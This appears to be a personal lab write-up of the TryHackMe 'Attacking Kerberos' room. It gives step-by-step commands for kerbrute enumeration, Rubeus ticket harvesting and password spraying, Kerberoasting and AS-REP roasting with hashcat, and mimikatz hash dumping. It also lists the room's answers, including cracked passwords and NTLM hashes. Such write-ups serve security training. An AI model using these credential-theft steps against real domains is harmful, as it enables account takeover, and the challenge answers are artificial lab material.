<- [[Writeup Index]]
<- [[Kerberos]]
# Attacking Kerberos
Link: https://tryhackme.com/room/attackingkerberos

**Covers**
- Basics of Attacking #Kerberos
- Enumeration w/ [[kerbrute]] and [[Rubeus]]
- [[Kerberos#Kerberoasting|Kerberoasting]]
- [[Kerberos#AS-REP Roasting|AS-REP Roasting with Rubeus and #Impacket]]
- [[Kerberos#Golden Ticket Silver Ticket|Golden/Silver Ticket Attacks]]
- [[Kerberos#Pass-the-Ticket|Pass-the-Ticket]]
- [[Kerberos#Skeleton Keys Backdoors|Skeleton key attacks using mimikatz]]


## Tasks
### Task 2 - Enumeration w/ Kerbrute
Conduct some basic recon on the target to discover relevant information:
`nmap -A 10.10.173.126`
![[attacking-kerberos-nmap-service&os-scan.png]]

Add Target IP and Domain Name to `/etc/hosts`:
![[kerbrute-add-hosts-entry.png]]

Enumerate users from word list using [[kerbrute]]:
![[attacking-kerberos-kerbrute-enumuser.png]]

#### Task 2 Questions
```
How many total users do we enumerate?
	10
What is the SQL service account name?
	sqlservice
What is the second "machine" account name?
	machine2
What is the third "user" account name?
	user3
```

### Task 3 - Harvesting & Brute-Forcing Tickets w/ Rubeus
[[Rubeus]] is a toolset for raw interactions and abuse of Kerberos. 
For this box its already installed on the target machine so no installation or configuration is necessary. 

First, SSH (or RDP) into the target machine `Administrator::P@$$W0rd`

#### Harvesting Tickets
1. Navigate to `Downloads` where Rubeus is
2. Tell Rubeus to harvest TGTs for 30 seconds
	1. `Rubeus.exe harvest /interval:30` ![[Rubeus-harvest-tickets-interval-30sec.png]]
		1. **NOTE** this will run indefinitely until you terminate, for the box you don't need to run it that long. 

Scrolling through the output we see that we've captured tickets from two accounts:
- `Administrator`, a domain admin ![[Attacking-Kerberos-Rubeus-Harvest-Ticket-Domain-Admin.png]]

- `CONTROLLER-1`, a domain controller ![[Attacking-Kerberos-Rubeus-Harvest-Ticket-Domain-Controller.png]]


#### Brute-Forcing / Password-Spraying w/ Rubeus
The box only asks you to password-spray the DC, rather than brute force a particular user. 

First, they recommend adding the IP and domain name of the DC to the Windows host file with:
`echo 10.10.173.126 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

*Technically* this is not necessary here, as Rubeus allows us to pass the IP of the DC in the command with `/dc:<IP_OF_DC>`

To spray **after** adding DC to hosts file:
`Rubeus.exe /password:Password1 /noticket`

To spray **w/o** adding DC to hosts file:
`Rubeus.exe /password:Password1 /dc:10.10.173.126 /noticket`

Spraying results in the following results and **.kirbi** ticket:

![[Rubeus-password-spray-example.png]]

#### Task 3 Questions
Both questions are answered from [[THM - Attacking Kerberos#Harvesting Tickets|Harvesting Tickets]]
```
Which domain admin do we get a ticket for when harvesting tickets?
	Administrator
Which domain controller do we get a ticket for when harvesting tickets?
	CONTROLLER-1
```

### Task 4 - Kerberoasting w/ Rubeus & Impacket
The largest difference between the two approaches, Rubeus and Impacket's GetUserSPNs.py, is that the latter can be done remotely while Rubeus requires execution on the target machine.

#### Rubeus Kerberoasting
See [[Rubeus#Kerberoasting]]
I recommend using `/nowrap` to make copying the hash easier. 

#### Impacket GetUserSPNs.py Kerberoasting
See [[GetUserSPNs.py#Example Usage]]

#### Cracking the Hash
With the hash saved to your local machine, you can crack it with hashcat (Pass.txt is provided in the tutorial):
`hashcat -m 13100 -a 0 hash.txt Pass.txt`

Once cracked use `--show` to show the cracked password. 

**HTTPService**
*Pass*: `Summer2020`
![[Attacking-Kerberos-Kerberoasting-cracked-hash-httpservice.png]]

**SQLService**
*Pass*: `MYPassword123`
![[Attacking-Kerberos-Kerberoasting-cracked-hash-sqlservice.png]]

#### Task 4 Questions
Questions answered after cracking hashes
```
What is the HTTPService Password?
	Summer2020
What is the SQLService Password?
	MYPassword123
```

### Task 5 - AS-REP Roasting w/ Rubeus
Very similar process to Task 4, retrieve the hashes and crack them. 

We'll only be using [[Rubeus]] this time.

#### Dumping KRBASREP5 Hashes w/ Rubeus
See [[Rubeus#AS-REP Roasting]]

Run `Rubeus.exe asreproast` which automatically scan for AS-REP Roastable users and attempt to grab the hashes.

![[Rubeus-AS-REP-Roasting-example.png]]

#### Crack the Hashes w/ hashcat
**IMPORTANT** Add `$23` after `$krb5asrep` and before the user in the hash for it to work with hashcat. 

Crack the hashes with (`Pass.txt` is the same provided wordlist from Task 4):
`hashcat -m 18200 -a 0 hash.txt Pass.txt`

![[Attacking-Kerberos-AS-REP-Roasting-cracked-hashes.png]]

#### Task 5 Questions
All questions can be answered after cracking hashes, EXCEPT Question 1, which requires looking up the hash type on the hastcat wiki (https://hashcat.net)
```
What has type does AS-REP Roasting use?
	Kerberos 5 AS-REP etype 23
Which User is vulenerable to AS-REP Roasting?
	User3
What is the User's Password?
	Password3
Which Admin is vulnerable to AS-REP Roasting?
	Admin2
What is the Admin's Password?
	P@$$W0rd2
```

### Task 6 - Pass the Ticket w/ mimikatz
There are no questions to answer here, but its good practice nonetheless. 

![[Mimikatz#Pass-the-Ticket]]

### Task 7 - Golden/Silver Ticket Attacks w/ mimikatz
This box only requires dumping the hashes and SIDs for accounts and not actually creating Golden/Silver Tickets, but check [[Mimikatz#Golden Silver Ticket Attacks]] for step by step on how. 

1. Make sure you're in `Downloads` so you can run `mimikatz`
2. Once running, run `privilege::debug` and check that your output is `Privilege '20' OK`, i.e. you have necessary privs.
4. Next run `lsadump::lsa /inject /name:SQLService` to dump the hash and SID of the SQLService account ![[Attacking-Kerberos-mimikatz-dump-SQLService-ticket.png]]
5. Next run `lsadump::lsa /inject /name:Administrator` to dump the hash and SID of the Administrator account ![[Attacking-Kerberos-mimikatz-dump-Administrator-ticket.png]]

#### Task 7 Questions
All questions can be answered after dumping the hashes/SIDs for the referenced accounts
```
What is the SQLService NTLM Hash?
	cd40c9ed96265531b21fc5b1dafcfb0a
What is the Administrator NTLM Hash?
	2777b7fec870e04dda00cd7260f7bee6
```

### Task 8 & 9
Have no questions to be answered, but Task 8 covers Backdoors w/ mimikatz via Skeleton keys. See [[Mimikatz#Backdoors and Skeleton Keys]]

